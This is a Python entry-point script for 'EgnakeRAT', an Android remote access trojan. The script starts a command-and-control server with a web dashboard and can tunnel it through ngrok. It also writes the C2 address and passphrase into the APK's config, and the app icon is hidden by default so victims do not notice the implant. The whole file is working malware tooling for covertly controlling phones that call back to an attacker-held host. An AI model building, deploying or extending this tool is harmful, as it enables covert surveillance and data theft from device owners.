import argparse
import sys
import os
import asyncio
import threading
import socket

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server.c2_server import C2Server
from server.logger import log

try:
    from pyngrok import ngrok, conf
    NGROK_AVAILABLE = True
except ImportError:
    NGROK_AVAILABLE = False


def start_server(args):
    ip = args.ip or "0.0.0.0"
    port = int(args.port) if args.port else 8000
    web_port = int(args.web_port) if args.web_port else 8080
    passphrase = args.key or None

    log.banner()

    c2 = C2Server(host=ip, port=port, passphrase=passphrase)

    if args.ngrok:
        if not NGROK_AVAILABLE:
            log.error("pyngrok not installed. Run: pip install pyngrok")
            sys.exit(1)
        conf.get_default().monitor_thread = False
        tcp_tunnel = ngrok.connect(port, "tcp")
        domain_port = tcp_tunnel.public_url[6:]
        ngrok_domain, ngrok_port = domain_port.split(":")
        ngrok_ip = socket.gethostbyname(ngrok_domain)
        log.success(f"Ngrok Tunnel: {ngrok_ip}:{ngrok_port}")
        log.info("Use this IP:PORT in the APK config")

    def run_c2():
        asyncio.run(c2.start())

    c2_thread = threading.Thread(target=run_c2, daemon=True)
    c2_thread.start()
    log.success(f"C2 listening on {ip}:{port}")

    from server.web.app import create_web_app
    app, socketio = create_web_app(c2)

    log.success(f"Web Dashboard: http://127.0.0.1:{web_port}")
    log.info("Open the URL above in your browser")
    print()

    try:
        socketio.run(app, host="0.0.0.0", port=web_port,
                     debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        log.info("Shutting down...")
        c2.stop()


def build_apk(args):
    ip = args.ip
    port = args.port

    if not ip or not port:
        if args.ngrok:
            if not NGROK_AVAILABLE:
                log.error("pyngrok not installed. Run: pip install pyngrok")
                sys.exit(1)
            conf.get_default().monitor_thread = False
            listener_port = int(port) if port else 8000
            tcp_tunnel = ngrok.connect(listener_port, "tcp")
            domain_port = tcp_tunnel.public_url[6:]
            ngrok_domain, ngrok_port = domain_port.split(":")
            ip = socket.gethostbyname(ngrok_domain)
            port = ngrok_port
            log.success(f"Ngrok Tunnel: {ip}:{port}")
        else:
            log.error("IP and PORT are required for build (or use --ngrok)")
            sys.exit(1)

    passphrase = args.key or "Buraya kendi şifrenizi girin"
    log.banner()
    log.info(f"Building APK: IP={ip} PORT={port}")

    config_path = os.path.join("Android_Code", "app", "src", "main", "java",
                               "com", "egnakerat", "system", "config.java")

    if not os.path.exists(config_path):
        log.error(f"Config file not found: {config_path}")
        sys.exit(1)

    config_content = f'''package com.egnakerat.system;

public class config {{
    public static String IP = "{ip}";
    public static String port = "{port}";
    public static boolean icon = {"true" if not args.icon else "false"};
    public static String PASSPHRASE = "{passphrase}";
}}
'''
    with open(config_path, "w") as f:
        f.write(config_content)

    log.success(f"Config updated: IP={ip}, PORT={port}")
    log.info("Build the APK using Android Studio:")
    log.info("  1. Open Android_Code/ in Android Studio")
    log.info("  2. Build → Generate Signed APK")
    log.info(f"  3. Or run: cd Android_Code && ./gradlew assembleRelease")
    log.info(f"Encryption key: {passphrase}")


def main():
    parser = argparse.ArgumentParser(
        prog="EgnakeRAT",
        description="EgnakeRAT — Advanced Remote Administration Tool",
        usage="%(prog)s [server | build] [options]"
    )

    subparsers = parser.add_subparsers(dest="mode")

    srv = subparsers.add_parser("server", help="Start C2 server with web dashboard")
    srv.add_argument("-i", "--ip", type=str, default="0.0.0.0", help="Listen IP (default: 0.0.0.0)")
    srv.add_argument("-p", "--port", type=str, default="8000", help="C2 port (default: 8000)")
    srv.add_argument("-w", "--web-port", type=str, default="8080", help="Web dashboard port (default: 8080)")
    srv.add_argument("--ngrok", action="store_true", help="Use ngrok tunnel")
    srv.add_argument("-k", "--key", type=str, help="Encryption passphrase")

    bld = subparsers.add_parser("build", help="Configure APK for building")
    bld.add_argument("-i", "--ip", type=str, help="C2 server IP")
    bld.add_argument("-p", "--port", type=str, help="C2 server port")
    bld.add_argument("-o", "--output", type=str, help="APK output name")
    bld.add_argument("--ngrok", action="store_true", help="Use ngrok tunnel")
    bld.add_argument("-icon", "--icon", action="store_true", help="Show app icon (default: hidden)")
    bld.add_argument("-k", "--key", type=str, help="Encryption passphrase")

    args = parser.parse_args()

    if args.mode == "server":
        start_server(args)
    elif args.mode == "build":
        build_apk(args)
    else:
        parser.print_help()
        print("\nExamples:")
        print("  python EgnakeRAT.py server -p 8000")
        print("  python EgnakeRAT.py server --ngrok")
        print("  python EgnakeRAT.py build -i 192.168.1.5 -p 8000")
        print("  python EgnakeRAT.py build --ngrok -k MySecretKey123")


if __name__ == "__main__":
    main()
